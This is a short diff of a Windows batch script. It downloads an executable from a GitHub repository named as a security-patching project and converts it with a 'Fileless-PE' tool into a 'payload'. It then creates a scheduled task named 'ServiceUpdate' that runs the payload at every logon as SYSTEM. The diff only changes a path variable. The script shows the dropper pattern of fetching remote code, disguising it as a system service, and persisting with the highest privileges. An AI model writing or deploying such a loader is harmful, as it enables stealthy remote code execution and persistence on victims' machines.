@@ -32,5 +32,5 @@ C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\python-3.14
 REM Generate payload
 (echo https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe && echo exe && echo %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py) | %AppDataPath%\%FolderName%\Fileless-PE-main\python.exe %AppDataPath%\%FolderName%\Fileless-PE-main\Fileless-PE.py
 REM Create Scheduled task and execute
-schtasks /create /tn ServiceUpdate /tr "'C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe' %AppDataPath%\%FolderName%\Fileless-PE-main\pythonw.exe %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py" /sc onlogon /ru System
+schtasks /create /tn ServiceUpdate /tr "%serviceUIpath% %AppDataPath%\%FolderName%\Fileless-PE-main\pythonw.exe %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py" /sc onlogon /ru System
 schtasks /run /tn ServiceUpdate
